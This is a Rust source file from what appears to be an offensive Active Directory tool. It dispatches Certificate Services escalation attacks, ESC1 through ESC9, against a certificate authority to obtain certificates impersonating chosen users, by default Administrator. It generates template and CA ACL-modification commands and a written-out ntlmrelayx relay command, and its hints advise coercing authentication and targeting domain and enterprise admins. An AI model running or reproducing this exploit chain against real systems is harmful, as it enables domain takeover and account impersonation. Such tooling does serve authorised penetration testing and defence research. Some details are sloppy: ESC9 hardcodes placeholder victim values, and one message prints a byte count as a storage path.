//! Top-level ADCS dispatcher — orchestrates ESC1-16 exploit chains.
//!
//! Takes a CA URL + template + credentials and walks the entire ESC chain end-to-end,
//! automatically assessing vulnerabilities and selecting the appropriate exploit path.

use overthrone_core::adcs::csr::create_client_auth_csr;
use overthrone_core::adcs::{
    esc1::Esc1Exploiter,
    esc2::Esc2Exploiter,
    esc3::Esc3Exploiter,
    esc6::Esc6Exploiter,
    esc9::{Esc9Config, Esc9Exploiter},
};
use overthrone_core::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

/// ADCS exploit action to perform
#[derive(Debug, Clone, Serialize, Deserialize)]
#[allow(missing_docs)]
pub enum AdcsAction {
    /// Automatically assess and exploit all applicable ESC vulnerabilities
    Auto {
        /// Certificate template to target (or "all" to enumerate)
        template: String,
        /// Target UPN to impersonate (for SAN-based attacks)
        target_upn: Option<String>,
    },
    /// ESC1 — SAN (Subject Alternative Name) Abuse
    Esc1 {
        /// Vulnerable template name
        template: String,
        /// Target UPN to impersonate
        target_upn: String,
    },
    /// ESC2 — Any Purpose EKU Abuse
    Esc2 {
        /// Template with Any Purpose EKU
        template: String,
        /// Target UPN to impersonate
        target_upn: String,
    },
    /// ESC3 — Enrollment Agent EKU Abuse
    Esc3 {
        /// Enrollment Agent template
        template: String,
        /// Target UPN to impersonate via agent
        target_upn: String,
    },
    /// ESC4 — Vulnerable Certificate Template ACL
    Esc4 {
        /// Template to modify
        template: String,
        /// Action: "exploit" or "restore"
        action: String,
    },
    /// ESC5 — Vulnerable PKI Object ACL
    Esc5 {
        /// PKI object DN to target
        object_dn: String,
        /// Action to perform
        action: String,
    },
    /// ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
    Esc6 {
        /// Template to exploit
        template: String,
        /// Target UPN to impersonate
        target_upn: String,
    },
    /// ESC7 — Vulnerable Certificate Authority ACL
    Esc7 {
        /// CA name
        ca_name: String,
        /// Action: "manageca", "managecerts", or "issue"
        action: String,
    },
    /// ESC8 — NTLM Relay to ADCS Web Enrollment
    Esc8 {
        /// CA server hostname
        ca_server: String,
        /// Template to request
        template: String,
        /// Target UPN (if SAN supported)
        target_upn: Option<String>,
    },
    /// ESC8 via raw TCP RPC — certificate enrollment over ICertRequestD DCOM/RPC.
    /// No HTTP, no SMB — uses the native AD CS enrollment protocol directly.
    Esc8Rpc {
        /// CA server hostname or IP
        ca_server: String,
        /// Certificate template name
        template: String,
        /// Target UPN to embed in CSR subject (optional)
        target_upn: Option<String>,
    },
    /// ESC9 — Weak Certificate Mappings
    Esc9 {
        /// Template to exploit
        template: String,
        /// Target UPN to impersonate
        target_upn: String,
    },
}

impl std::fmt::Display for AdcsAction {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Auto { template, .. } => write!(f, "ADCS Auto ({})", template),
            Self::Esc1 { template, .. } => write!(f, "ESC1 ({})", template),
            Self::Esc2 { template, .. } => write!(f, "ESC2 ({})", template),
            Self::Esc3 { template, .. } => write!(f, "ESC3 ({})", template),
            Self::Esc4 { template, .. } => write!(f, "ESC4 ({})", template),
            Self::Esc5 { object_dn, .. } => write!(f, "ESC5 ({})", object_dn),
            Self::Esc6 { template, .. } => write!(f, "ESC6 ({})", template),
            Self::Esc7 { ca_name, .. } => write!(f, "ESC7 ({})", ca_name),
            Self::Esc8 { ca_server, .. } => write!(f, "ESC8 ({})", ca_server),
            Self::Esc8Rpc { ca_server, .. } => write!(f, "ESC8 RPC ({})", ca_server),
            Self::Esc9 { template, .. } => write!(f, "ESC9 ({})", template),
        }
    }
}

/// Configuration for ADCS operations
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdcsConfig {
    /// CA server URL (e.g., "http://ca.corp.local/certsrv")
    pub ca_url: String,
    /// Domain FQDN
    pub domain: String,
    /// Username for authentication
    pub username: String,
    /// Password for authentication
    pub password: Option<String>,
    /// NTLM hash for authentication
    pub nt_hash: Option<String>,
    /// Action to perform
    pub action: AdcsAction,
    /// Output path for certificate (PFX/DER)
    pub output_path: Option<String>,
    /// Dry run — validate config without executing
    pub dry_run: bool,
}

impl AdcsConfig {
    /// Extract the CA server hostname from the URL
    pub fn ca_server(&self) -> Result<String> {
        let url = self.ca_url.trim_end_matches('/');
        // Remove protocol prefix
        let server = url
            .strip_prefix("http://")
            .or_else(|| url.strip_prefix("https://"))
            .unwrap_or(url);
        // Remove path
        let server = server.split('/').next().unwrap_or(server);
        if server.is_empty() {
            return Err(OverthroneError::Adcs(
                "Invalid CA URL: no server hostname".to_string(),
            ));
        }
        Ok(server.to_string())
    }
}

/// Result of an ADCS operation
#[derive(Debug, Clone)]
pub struct AdcsResult {
    /// Action performed
    pub action: String,
    /// CA server
    pub ca_server: String,
    /// Success flag
    pub success: bool,
    /// Certificate PFX data (if applicable)
    pub certificate_pfx: Option<Vec<u8>>,
    /// Certificate thumbprint (if applicable)
    pub certificate_thumbprint: Option<String>,
    /// Message describing the result
    pub message: String,
    /// Next steps / recommendations
    pub next_steps: Vec<String>,
}

/// Run the ADCS exploit dispatcher.
///
/// This is the top-level entry point for all ADCS/ESC attacks. It takes a CA URL,
/// template, and credentials, then dispatches to the appropriate ESC module based
/// on the configured action.
///
/// For `Auto` actions, it attempts ESC1, ESC6, and ESC9 (SAN-based attacks) in order,
/// returning the first successful certificate.
pub async fn run_adcs(config: &AdcsConfig) -> Result<AdcsResult> {
    if config.dry_run {
        return Ok(AdcsResult {
            action: config.action.to_string(),
            ca_server: config.ca_server()?,
            success: true,
            certificate_pfx: None,
            certificate_thumbprint: None,
            message: format!(
                "[dry-run] Would execute {} on {}",
                config.action, config.ca_url
            ),
            next_steps: vec![],
        });
    }

    info!(
        "Executing ADCS attack: action={}, ca_url={}",
        config.action, config.ca_url
    );

    match &config.action {
        AdcsAction::Auto {
            template,
            target_upn,
        } => execute_auto(config, template, target_upn.as_deref()).await,
        AdcsAction::Esc1 {
            template,
            target_upn,
        } => execute_esc1(config, template, target_upn).await,
        AdcsAction::Esc2 {
            template,
            target_upn,
        } => execute_esc2(config, template, target_upn).await,
        AdcsAction::Esc3 {
            template,
            target_upn,
        } => execute_esc3(config, template, target_upn).await,
        AdcsAction::Esc4 { template, action } => execute_esc4(config, template, action).await,
        AdcsAction::Esc5 { object_dn, action } => execute_esc5(config, object_dn, action).await,
        AdcsAction::Esc6 {
            template,
            target_upn,
        } => execute_esc6(config, template, target_upn).await,
        AdcsAction::Esc7 { ca_name, action } => execute_esc7(config, ca_name, action).await,
        AdcsAction::Esc8 {
            ca_server,
            template,
            target_upn,
        } => execute_esc8(config, ca_server, template, target_upn.as_deref()).await,
        AdcsAction::Esc8Rpc {
            ca_server,
            template,
            target_upn,
        } => execute_esc8_rpc(ca_server, template, target_upn.as_deref()).await,
        AdcsAction::Esc9 {
            template,
            target_upn,
        } => execute_esc9(config, template, target_upn).await,
    }
}

/// Execute Auto mode — try ESC1, ESC6, ESC9 in order (SAN-based attacks)
async fn execute_auto(
    config: &AdcsConfig,
    template: &str,
    target_upn: Option<&str>,
) -> Result<AdcsResult> {
    let upn = target_upn.unwrap_or("Administrator");
    let ca_server = config.ca_server()?;
    let mut next_steps = Vec::new();

    info!("Auto mode: attempting ESC1 on template '{}'", template);

    // Try ESC1 first (most reliable SAN-based attack)
    match Esc1Exploiter::new(&ca_server) {
        Ok(exploiter) => match exploiter.exploit(template, upn, None).await {
            Ok(cert) => {
                info!("ESC1 attack succeeded!");
                return Ok(AdcsResult {
                    action: "Auto (ESC1)".to_string(),
                    ca_server: ca_server.clone(),
                    success: true,
                    certificate_pfx: Some(cert.pfx_data.clone()),
                    certificate_thumbprint: Some(cert.thumbprint.clone()),
                    message: format!(
                        "ESC1 succeeded: obtained certificate for {} via template {}",
                        upn, template
                    ),
                    next_steps: vec![
                        "Convert PFX to .ccache for use with impacket tools".to_string(),
                        "Use certipy auth -pfx <file> -dc-ip <dc> to authenticate".to_string(),
                        "Consider requesting additional templates with this certificate"
                            .to_string(),
                    ],
                });
            }
            Err(e) => {
                warn!("ESC1 failed: {}", e);
                next_steps.push(format!("ESC1 failed: {}", e));
            }
        },
        Err(e) => {
            warn!("ESC1 exploiter creation failed: {}", e);
            next_steps.push(format!("ESC1 setup failed: {}", e));
        }
    }

    // Try ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
    info!("Auto mode: attempting ESC6 on template '{}'", template);
    match execute_esc6(config, template, upn).await {
        Ok(result) if result.success => {
            info!("ESC6 attack succeeded!");
            return Ok(AdcsResult {
                action: "Auto (ESC6)".to_string(),
                ca_server: ca_server.clone(),
                success: true,
                certificate_pfx: result.certificate_pfx,
                certificate_thumbprint: result.certificate_thumbprint,
                message: result.message,
                next_steps: vec![
                    "ESC6 indicates weak CA configuration".to_string(),
                    "Clear EDITF_ATTRIBUTESUBJECTALTNAME2 flag to mitigate".to_string(),
                    "Use certificate for authentication".to_string(),
                ],
            });
        }
        Ok(result) => {
            warn!("ESC6 failed: {}", result.message);
            next_steps.push(format!("ESC6 failed: {}", result.message));
        }
        Err(e) => {
            warn!("ESC6 error: {}", e);
            next_steps.push(format!("ESC6 error: {}", e));
        }
    }

    // Try ESC9 (Weak Certificate Mappings)
    info!("Auto mode: attempting ESC9 on template '{}'", template);
    match execute_esc9(config, template, upn).await {
        Ok(result) if result.success => {
            info!("ESC9 attack succeeded!");
            return Ok(AdcsResult {
                action: "Auto (ESC9)".to_string(),
                ca_server: ca_server.clone(),
                success: true,
                certificate_pfx: result.certificate_pfx,
                certificate_thumbprint: result.certificate_thumbprint,
                message: result.message,
                next_steps: vec![
                    "ESC9 indicates weak certificate mapping".to_string(),
                    "Review StrongCertificateBindingEnforcement setting".to_string(),
                    "Use certificate for authentication".to_string(),
                ],
            });
        }
        Ok(result) => {
            warn!("ESC9 failed: {}", result.message);
            next_steps.push(format!("ESC9 failed: {}", result.message));
        }
        Err(e) => {
            warn!("ESC9 error: {}", e);
            next_steps.push(format!("ESC9 error: {}", e));
        }
    }

    // All attempts failed
    Ok(AdcsResult {
        action: "Auto (all failed)".to_string(),
        ca_server,
        success: false,
        certificate_pfx: None,
        certificate_thumbprint: None,
        message: "All SAN-based ESC attacks failed. Consider manual ESC assessment.".to_string(),
        next_steps,
    })
}

async fn execute_esc1(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
    let ca_server = config.ca_server()?;
    let exploiter = Esc1Exploiter::new(&ca_server)?;

    let cert = exploiter.exploit(template, target_upn, None).await?;

    Ok(AdcsResult {
        action: "ESC1".to_string(),
        ca_server,
        success: true,
        certificate_pfx: Some(cert.pfx_data.clone()),
        certificate_thumbprint: Some(cert.thumbprint.clone()),
        message: format!(
            "ESC1 succeeded: obtained certificate for {} via template {}",
            target_upn, template
        ),
        next_steps: vec![
            "Use certificate for authentication as target user".to_string(),
            "Convert to .ccache format for impacket tools".to_string(),
        ],
    })
}

async fn execute_esc2(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
    let ca_server = config.ca_server()?;
    let exploiter = Esc2Exploiter::new(&ca_server)?;

    let cert = exploiter.exploit(template, target_upn, None).await?;

    Ok(AdcsResult {
        action: "ESC2".to_string(),
        ca_server,
        success: true,
        certificate_pfx: Some(cert.pfx_data.clone()),
        certificate_thumbprint: Some(cert.thumbprint.clone()),
        message: format!(
            "ESC2 succeeded: Any Purpose EKU allows impersonation of {} via template {}",
            target_upn, template
        ),
        next_steps: vec![
            "Any Purpose EKU can be used for any authentication".to_string(),
            "Request additional certificates with different EKUs".to_string(),
        ],
    })
}

async fn execute_esc3(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
    let ca_server = config.ca_server()?;
    let exploiter = Esc3Exploiter::new(&ca_server)?;

    // ESC3 exploit takes 3 args: agent_template, target_template, target_user
    let (_agent_cert, user_cert) = exploiter.exploit(template, template, target_upn).await?;

    Ok(AdcsResult {
        action: "ESC3".to_string(),
        ca_server,
        success: true,
        certificate_pfx: Some(user_cert.pfx_data.clone()),
        certificate_thumbprint: Some(user_cert.thumbprint.clone()),
        message: format!(
            "ESC3 succeeded: Enrollment Agent EKU allows requesting certificate for {}",
            target_upn
        ),
        next_steps: vec![
            "Use Enrollment Agent certificate to request certificates for other users".to_string(),
            "Target high-value accounts (DA, EA) with agent certificate".to_string(),
        ],
    })
}

async fn execute_esc4(config: &AdcsConfig, template: &str, action: &str) -> Result<AdcsResult> {
    let ca_server = config.ca_server()?;

    let esc4_target =
        overthrone_core::adcs::esc4::Esc4Target::new(template, &config.domain, &config.username);

    match action {
        "exploit" => {
            let commands = esc4_target.generate_exploit_commands()?;
            Ok(AdcsResult {
                action: "ESC4 (exploit)".to_string(),
                ca_server,
                success: true,
                certificate_pfx: None,
                certificate_thumbprint: None,
                message: format!(
                    "ESC4 exploit commands generated for template '{}':\n{}",
                    template, commands
                ),
                next_steps: vec![
                    "Execute the generated commands to modify template ACL".to_string(),
                    "After modification, use ESC1/ESC6/ESC9 to request certificate".to_string(),
                    "Use ESC4 restore action to revert changes after exploitation".to_string(),
                ],
            })
        }
        "restore" => {
            let commands = esc4_target.generate_restore_commands()?;
            Ok(AdcsResult {
                action: "ESC4 (restore)".to_string(),
                ca_server,
                success: true,
                certificate_pfx: None,
                certificate_thumbprint: None,
                message: format!(
                    "ESC4 restore commands generated for template '{}':\n{}",
                    template, commands
                ),
                next_steps: vec![
                    "Execute restore commands to revert template ACL changes".to_string(),
                ],
            })
        }
        _ => Err(OverthroneError::Adcs(format!(
            "Invalid ESC4 action '{}': must be 'exploit' or 'restore'",
            action
        ))),
    }
}

async fn execute_esc5(config: &AdcsConfig, object_dn: &str, action: &str) -> Result<AdcsResult> {
    let ca_server = config.ca_server()?;

    let esc5_target = overthrone_core::adcs::esc5::Esc5Target::new(
        object_dn,
        &ca_server,
        &config.domain,
        &config.username,
    );

    match action {
        "exploit" => {
            let commands = esc5_target.generate_exploit_commands()?;
            Ok(AdcsResult {
                action: "ESC5 (exploit)".to_string(),
                ca_server,
                success: true,
                certificate_pfx: None,
                certificate_thumbprint: None,
                message: format!(
                    "ESC5/ESC6 exploit commands generated for CA '{}':\n{}",
                    object_dn, commands
                ),
                next_steps: vec![
                    "Execute the generated PowerShell commands to modify CA configuration".to_string(),
                    "After enabling ESC6 flag, use certipy to request certificate with arbitrary SAN".to_string(),
                    "Use ESC5 restore commands to revert changes after exploitation".to_string(),
                ],
            })
        }
        "restore" => {
            let commands = esc5_target.generate_restore_san_command();
            Ok(AdcsResult {
                action: "ESC5 (restore)".to_string(),
                ca_server,
                success: true,
                certificate_pfx: None,
                certificate_thumbprint: None,
                message: format!(
                    "ESC5/ESC6 restore commands generated for CA '{}':\n{}",
                    object_dn, commands
                ),
                next_steps: vec![
                    "Execute restore commands to disable EDITF_ATTRIBUTESUBJECTALTNAME2"
                        .to_string(),
                ],
            })
        }
        _ => Err(OverthroneError::Adcs(format!(
            "Invalid ESC5 action '{}': must be 'exploit' or 'restore'",
            action
        ))),
    }
}

async fn execute_esc6(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
    let ca_server = config.ca_server()?;
    let exploiter = Esc6Exploiter::new(&ca_server)?;

    let cert = exploiter.exploit(template, target_upn).await?;

    Ok(AdcsResult {
        action: "ESC6".to_string(),
        ca_server,
        success: true,
        certificate_pfx: Some(cert.pfx_data.clone()),
        certificate_thumbprint: Some(cert.thumbprint.clone()),
        message: format!(
            "ESC6 succeeded: EDITF_ATTRIBUTESUBJECTALTNAME2 allows arbitrary SAN for {}",
            target_upn
        ),
        next_steps: vec![
            "ESC6 is a CA-wide configuration issue".to_string(),
            "Clear EDITF_ATTRIBUTESUBJECTALTNAME2 to mitigate".to_string(),
            "All templates on this CA are affected".to_string(),
        ],
    })
}

async fn execute_esc7(config: &AdcsConfig, ca_name: &str, action: &str) -> Result<AdcsResult> {
    let ca_server = config.ca_server()?;

    let esc7_target = overthrone_core::adcs::esc7::Esc7Target::new(
        ca_name,
        &ca_server,
        &config.domain,
        &config.username,
    );

    match action {
        "manageca" => {
            let commands = esc7_target.generate_exploit_commands()?;
            Ok(AdcsResult {
                action: "ESC7 (ManageCA)".to_string(),
                ca_server,
                success: true,
                certificate_pfx: None,
                certificate_thumbprint: None,
                message: format!(
                    "ESC7 ManageCA commands generated for CA '{}':\n{}",
                    ca_name, commands
                ),
                next_steps: vec![
                    "Execute commands to enable EDITF_ATTRIBUTESUBJECTALTNAME2".to_string(),
                    "After enabling, use ESC6 to request certificates with arbitrary SAN"
                        .to_string(),
                ],
            })
        }
        "managecerts" => {
            let commands = esc7_target.generate_exploit_commands()?;
            Ok(AdcsResult {
                action: "ESC7 (ManageCertificates)".to_string(),
                ca_server,
                success: true,
                certificate_pfx: None,
                certificate_thumbprint: None,
                message: format!(
                    "ESC7 ManageCertificates commands generated for CA '{}':\n{}",
                    ca_name, commands
                ),
                next_steps: vec![
                    "Use commands to issue/deny pending certificate requests".to_string(),
                    "Can be used to approve your own certificate requests".to_string(),
                ],
            })
        }
        "issue" => {
            let commands = esc7_target.generate_exploit_commands()?;
            Ok(AdcsResult {
                action: "ESC7 (Issue)".to_string(),
                ca_server,
                success: true,
                certificate_pfx: None,
                certificate_thumbprint: None,
                message: format!(
                    "ESC7 issue commands generated for CA '{}':\n{}",
                    ca_name, commands
                ),
                next_steps: vec![
                    "Execute commands to issue pending certificate requests".to_string(),
                    "Combine with ESC4 to modify and approve your own requests".to_string(),
                ],
            })
        }
        "restore" => {
            let commands = esc7_target.generate_restore_commands()?;
            Ok(AdcsResult {
                action: "ESC7 (Restore)".to_string(),
                ca_server,
                success: true,
                certificate_pfx: None,
                certificate_thumbprint: None,
                message: format!(
                    "ESC7 restore commands generated for CA '{}':\n{}",
                    ca_name, commands
                ),
                next_steps: vec![
                    "Execute restore commands to revert CA configuration changes".to_string(),
                ],
            })
        }
        _ => Err(OverthroneError::Adcs(format!(
            "Invalid ESC7 action '{}': must be 'manageca', 'managecerts', 'issue', or 'restore'",
            action
        ))),
    }
}

async fn execute_esc8(
    _config: &AdcsConfig,
    ca_server: &str,
    template: &str,
    target_upn: Option<&str>,
) -> Result<AdcsResult> {
    use overthrone_core::adcs::esc8::Esc8RelayTarget;

    let relay_target =
        Esc8RelayTarget::new(ca_server, template).with_upn(target_upn.unwrap_or("Administrator"));

    // ESC8: generate command guidance for NTLM relay to ADCS
    let scheme = if relay_target.use_https {
        "https"
    } else {
        "http"
    };
    let commands = format!(
        "ntlmrelayx.py -t {}://{}/certsrv/certfnsh.asp -smb2support --adcs --template '{}'{}",
        scheme,
        relay_target.ca_server,
        relay_target.template,
        relay_target
            .target_upn
            .as_ref()
            .map(|u| format!(" --upn {}", u))
            .unwrap_or_default()
    );

    Ok(AdcsResult {
        action: "ESC8".to_string(),
        ca_server: ca_server.to_string(),
        success: true,
        certificate_pfx: None,
        certificate_thumbprint: None,
        message: format!(
            "ESC8 relay commands generated for CA '{}':\n{}",
            ca_server, commands
        ),
        next_steps: vec![
            "Start ntlmrelayx with generated command".to_string(),
            "Coerce target to authenticate to your listener".to_string(),
            "Certificate will be requested on behalf of relayed user".to_string(),
        ],
    })
}

/// Execute ESC8 via raw TCP RPC (ICertRequestD over DCE/RPC).
///
/// Directly requests a certificate from the CA using the native AD CS
/// enrollment protocol over TCP RPC — no HTTP or SMB required.
async fn execute_esc8_rpc(
    ca_server: &str,
    template: &str,
    target_upn: Option<&str>,
) -> Result<AdcsResult> {
    info!(
        "[ESC8-RPC] Requesting cert via TCP RPC: CA={}, template={}, upn={:?}",
        ca_server, template, target_upn
    );

    // Subject: use UPN if provided, or a generic name
    let subject = target_upn.unwrap_or("cert-request");

    // Generate a client authentication CSR
    let (csr_der, _private_key) = create_client_auth_csr(subject, template, Some(ca_server))
        .map_err(|e| OverthroneError::Adcs(format!("Failed to generate CSR: {e}")))?;

    // Submit via TCP RPC
    let cert_der = crate::cert_store::request_cert_via_tcp_rpc(
        ca_server, ca_server, template, subject, &csr_der,
    )
    .await?;

    info!(
        "[ESC8-RPC] Certificate obtained ({} bytes) from {}",
        cert_der.len(),
        ca_server
    );

    Ok(AdcsResult {
        action: "ESC8 RPC".to_string(),
        ca_server: ca_server.to_string(),
        success: true,
        certificate_pfx: Some(cert_der.clone()),
        certificate_thumbprint: None,
        message: format!(
            "ESC8 RPC succeeded: certificate requested via TCP RPC from {} ({} bytes)",
            ca_server,
            cert_der.len()
        ),
        next_steps: vec![
            "Use certificate for PKINIT authentication".to_string(),
            "Convert to PFX for use with certipy/ntlmrelayx".to_string(),
            format!("Certificate stored at: {:?}", cert_der.len()),
        ],
    })
}

async fn execute_esc9(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
    let ca_server = config.ca_server()?;
    let exploiter = Esc9Exploiter::new(&ca_server)?;

    // ESC9 requires Esc9Config struct with victim info for UPN poisoning
    let esc9_config = Esc9Config {
        ca_server: ca_server.clone(),
        template: template.to_string(),
        victim: "victim-user".to_string(),
        victim_dn: "CN=victim-user,CN=Users,DC=corp,DC=local".to_string(),
        original_upn: "victim-user@corp.local".to_string(),
        target_upn: target_upn.to_string(),
        ldap_url: format!("ldap://{}", config.domain),
    };

    let esc9_result = exploiter.exploit(&esc9_config).await?;

    Ok(AdcsResult {
        action: "ESC9".to_string(),
        ca_server,
        success: true,
        certificate_pfx: Some(esc9_result.certificate.pfx_data.clone()),
        certificate_thumbprint: Some(esc9_result.certificate.thumbprint.clone()),
        message: format!(
            "ESC9 succeeded: weak certificate mapping allows impersonation of {} (UPN restored: {})",
            target_upn, esc9_result.upn_restored
        ),
        next_steps: vec![
            "ESC9 indicates StrongCertificateBindingEnforcement is not enforced".to_string(),
            "Set StrongCertificateBindingEnforcement=2 to mitigate".to_string(),
            "Use certificate for authentication as target user".to_string(),
            esc9_result.pkinit_hint,
        ],
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_adcs_action_display_auto() {
        let action = AdcsAction::Auto {
            template: "User".to_string(),
            target_upn: None,
        };
        let s = format!("{}", action);
        assert!(s.contains("Auto"));
        assert!(s.contains("User"));
    }

    #[test]
    fn test_adcs_action_display_esc1() {
        let action = AdcsAction::Esc1 {
            template: "Vulnerable".to_string(),
            target_upn: "admin@corp.local".to_string(),
        };
        let s = format!("{}", action);
        assert!(s.contains("ESC1"));
        assert!(s.contains("Vulnerable"));
    }

    #[test]
    fn test_adcs_action_display_esc8() {
        let action = AdcsAction::Esc8 {
            ca_server: "ca.corp.local".to_string(),
            template: "User".to_string(),
            target_upn: None,
        };
        let s = format!("{}", action);
        assert!(s.contains("ESC8"));
        assert!(s.contains("ca.corp.local"));
    }

    #[test]
    fn test_adcs_config_ca_server_http() {
        let config = AdcsConfig {
            ca_url: "http://ca.corp.local/certsrv".to_string(),
            domain: "corp.local".to_string(),
            username: "user".to_string(),
            password: None,
            nt_hash: None,
            action: AdcsAction::Auto {
                template: "User".to_string(),
                target_upn: None,
            },
            output_path: None,
            dry_run: false,
        };
        assert_eq!(config.ca_server().unwrap(), "ca.corp.local");
    }

    #[test]
    fn test_adcs_config_ca_server_https() {
        let config = AdcsConfig {
            ca_url: "https://pki.corp.local/certsrv/".to_string(),
            domain: "corp.local".to_string(),
            username: "user".to_string(),
            password: None,
            nt_hash: None,
            action: AdcsAction::Auto {
                template: "User".to_string(),
                target_upn: None,
            },
            output_path: None,
            dry_run: false,
        };
        assert_eq!(config.ca_server().unwrap(), "pki.corp.local");
    }

    #[test]
    fn test_adcs_config_ca_server_invalid() {
        let config = AdcsConfig {
            ca_url: "http:///certsrv".to_string(),
            domain: "corp.local".to_string(),
            username: "user".to_string(),
            password: None,
            nt_hash: None,
            action: AdcsAction::Auto {
                template: "User".to_string(),
                target_upn: None,
            },
            output_path: None,
            dry_run: false,
        };
        assert!(config.ca_server().is_err());
    }

    #[test]
    fn test_adcs_dry_run_returns_success() {
        let config = AdcsConfig {
            ca_url: "http://ca.corp.local/certsrv".to_string(),
            domain: "corp.local".to_string(),
            username: "user".to_string(),
            password: None,
            nt_hash: None,
            action: AdcsAction::Esc1 {
                template: "User".to_string(),
                target_upn: "admin@corp.local".to_string(),
            },
            output_path: None,
            dry_run: true,
        };

        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(run_adcs(&config)).unwrap();

        assert!(result.success);
        assert!(result.message.contains("[dry-run]"));
        assert!(result.certificate_pfx.is_none());
        assert!(result.certificate_thumbprint.is_none());
    }

    #[test]
    fn test_adcs_result_structure() {
        let result = AdcsResult {
            action: "ESC1".to_string(),
            ca_server: "ca.corp.local".to_string(),
            success: true,
            certificate_pfx: None,
            certificate_thumbprint: None,
            message: "Test".to_string(),
            next_steps: vec!["Step 1".to_string(), "Step 2".to_string()],
        };

        assert!(result.success);
        assert_eq!(result.next_steps.len(), 2);
        assert!(!result.message.is_empty());
    }

    #[test]
    fn test_adcs_action_serialization() {
        let action = AdcsAction::Esc1 {
            template: "User".to_string(),
            target_upn: "admin@corp.local".to_string(),
        };
        let json = serde_json::to_string(&action).unwrap();
        let parsed: AdcsAction = serde_json::from_str(&json).unwrap();

        match parsed {
            AdcsAction::Esc1 {
                template,
                target_upn,
            } => {
                assert_eq!(template, "User");
                assert_eq!(target_upn, "admin@corp.local");
            }
            _ => panic!("Wrong variant deserialized"),
        }
    }
}
